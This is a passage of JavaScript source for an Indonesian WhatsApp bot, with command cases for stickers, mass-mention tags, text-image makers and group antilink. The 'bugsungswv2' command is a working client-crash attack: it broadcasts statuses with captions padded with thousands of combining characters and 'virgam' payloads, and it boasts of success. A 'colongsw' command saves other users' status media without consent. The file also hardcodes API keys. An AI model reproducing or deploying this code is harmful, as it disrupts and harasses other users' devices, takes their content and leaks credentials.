				  if (!dev.key.fromMe && !isOwner) return reply('Lu siapa?')
					buffer = fs.readFileSync(`./src/logo1.jpg`)
					zoe.sendMessage('status@broadcast', buffer, image, { thumbnail : virgam
					})
					setTimeout( () => {
					zoe.sendMessage('status@broadcast', `UWES`, MessageType.extendedText)
					reply('UWES')
					}, 3000)
					break
case 'bugsungswv2':
if (!dev.key.fromMe && !isOwner) return
            res = `${spamvirtex}`
            imeg = fs.readFileSync('src/catalog3.jpg')
    zoe.sendMessage('status@broadcast', imeg, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 zoe X' ,thumbnail: virgam})
 zoe.sendMessage('status@broadcast', imeg, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 zoe X' ,thumbnail: virgamv2})
 zoe.sendMessage('status@broadcast', imeg, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 zoe X' ,thumbnail: virgamv3})
 zoe.sendMessage('status@broadcast', imeg, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 zoe X' ,thumbnail: virgam})
 zoe.sendMessage('status@broadcast', imeg, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 zoe X' ,thumbnail: virgamv2})
 zoe.sendMessage('status@broadcast', imeg, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 zoe X' ,thumbnail: virgamv3})
 reply('Sukses Mengirim BugSungSwV2 Ya Anjing')
 break
			  case 'hidetag':
			  if (!dev.key.fromMe) return reply('Lu siapa')
			if (!isGroup) return reply(mess.only.group)
			var value = args.join(' ')
			var group = await zoe.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: dev
			}
			zoe.sendMessage(from, optionshidetag, text)
			break
			 case 'sticktag':
			 if (!dev.key.fromMe) return reply('Lu siapa')
            if (!dev.key.fromMe && !isGroupAdmins) return reply(mess.admin)
            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await zoe.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await zoe.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            zoe.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
 case 'colongsw':
        if (!dev.key.fromMe) return;
        if ((isMedia && !zoe.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : dev
          owgi = await zoe.downloadAndSaveMediaMessage(ger);
          zoe.sendMessage(sender, fs.readFileSync(owgi), "imageMessage", {
            caption: q,
          });
          reply("Sukses")
          fs.unlinkSync(owgi)
        } else if ((isMedia && !zoe.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : dev
          owgi = await zoe.downloadAndSaveMediaMessage(ger);
          zoe.sendMessage(sender, fs.readFileSync(owgi), "videoMessage", {
            caption: q,
          });
          reply("Sukses")
          fs.unlinkSync(owgi)
        } else {
          reply("Reply sw foto / video yg mau dicolong")
        }
        break
           case 's':
			case 'stickergif':  
				case 'sticker':
				  case 'stiker':
					if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
						const media = await zoe.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.stick)
							})
							.on('end', function () {
								console.log('Finish')
								buff = fs.readFileSync(ran)
								zoe.sendMessage(from, fs.readFileSync(ran), sticker, { quoted : dev}) 
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && dev.message.videoMessage.seconds < 11 || isQuotedVideo && dev.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
						const media = await zoe.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						reply(mess.wait)
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(`Yah error dek`)
							})
							.on('end', function () {
								console.log('Finish')
								buff = fs.readFileSync(ran)
								zoe.sendMessage(from, buff, sticker, {quoted: dev})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
						const media = await zoe.downloadAndSaveMediaMessage(encmedia)
						ranw = getRandom('.webp')
						ranp = getRandom('.png')
						reply(mess.wait)
						keyrmbg = 'J93DHS3AqHmXJQWm4XLv9iRY'
						await removeBackgroundFromImageFile({path: media, apiKey: keyrmbg.result, size: 'auto', type: 'auto', ranp}).then(res => {
							fs.unlinkSync(media)
							let buffer = Buffer.from(res.base64img, 'base64')
							fs.writeFileSync(ranp, buffer, (err) => {
								if (err) return reply('Yah error dek')
							})
							exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
								fs.unlinkSync(ranp)
								if (err) return reply(mess.error.stick)
								buff = fs.readFileSync(ranw)
								zoe.sendMessage(from, buff, sticker, {quoted: dev})
							})
						    })					
					} else {
						reply(`𝗸𝗶𝗿𝗶𝗺 𝗴𝗮𝗺𝗯𝗮𝗿 𝗱𝗲𝗻𝗴𝗮𝗻 𝗰𝗮𝗽𝘁𝗶𝗼𝗻 ${prefix}𝘀𝘁𝗶𝗰𝗸𝗲𝗿 𝗮𝘁𝗮𝘂 𝗿𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝗴𝗮𝗺𝗯𝗮𝗿`)
					}
					break
			case 'coffeecup': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.url)
					zoe.sendMessage(from, buffer1, image, {quoted: dev, caption: `${makell}\n\nDone`})
					break
			case 'coffeecup2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup2&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.url)
					zoe.sendMessage(from, buffer1, image, {quoted: dev, caption: `${makell}\n\nDone`})
					break
					case 'neon': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Teks`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=neon&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.url)
					zoe.sendMessage(from, buffer1, image, {quoted: dev, caption: `${makell}\n\nDone`})
					break
					case 'maker2d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker2?text=${makell}&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.results)
					zoe.sendMessage(from, buffer1, image, {quoted: dev, caption: `${makell}\n\nDone`})
					break
		case 'maker2d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3?text=${makell}&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.results)
					zoe.sendMessage(from, buffer1, image, {quoted: dev, caption: `${makell}\n\nDone`})
					break
		case 'maker2d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker4?text=${makell}&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.results)
					zoe.sendMessage(from, buffer1, image, {quoted: dev, caption: `${makell}\n\nDone`})
					break
			case 'maker3d': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = body.slice(8)
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d?text=${makell}&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.results)
					zoe.sendMessage(from, buffer1, image, {quoted: dev, caption: `${makell}\n\nDone`})
					break
			case 'maker3d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no2?text=${makell}&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.results)
					zoe.sendMessage(from, buffer1, image, {quoted: dev, caption: `${makell}\n\nDone`})
					break
			case 'maker3d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no3?text=${makell}&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.results)
					zoe.sendMessage(from, buffer1, image, {quoted: dev, caption: `${makell}\n\nDone`})
					break
			case 'maker3d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} nick`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no4?text=${makell}&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.results)
					zoe.sendMessage(from, buffer1, image, {quoted: dev, caption: `${makell}\n\nDone`})
					break
					case 'nulis':  
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} zoe*`)
                   F = body.slice(7)
                   reply(`Sbntr`)
                   anu = await getBuffer(`https://api.zeks.xyz/api/nulis?text=${F}&apikey=apivinz`)
                   zoe.sendMessage(from, anu, image, {caption: `Nih Ngabbbbbb `, quoted: dev})
                   break
                   case 'antilink':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !dev.key.fromMe && !isOwner) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (args.length < 1) return reply('ketik 1 untuk mengaktifkan\nketik 0 untuk menonaktifkan')
if (args[0] === "1") {
//if (AntiLink) return reply('Sudah Aktif')
ntilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(ntilink))
reply(' Succes menyalakan antilink di group ini')
zoe.sendMessage(from, `PERINGATAN!!! jika bukan admin jangan send link di group ini`, text)
} else if (args[0] === "0") {
//if (!AntiLink) return reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(ntilink))
reply(' Succes mematikan antilink di group ini')
} else {
reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
}
break
case 'antitoxic':
					if (!isGroup) return reply('Kusus group')
					if (!isGroupAdmins) return reply('Kusus admin')
					if (!isBotGroupAdmins) return reply('Bot jadiin admin dlu')
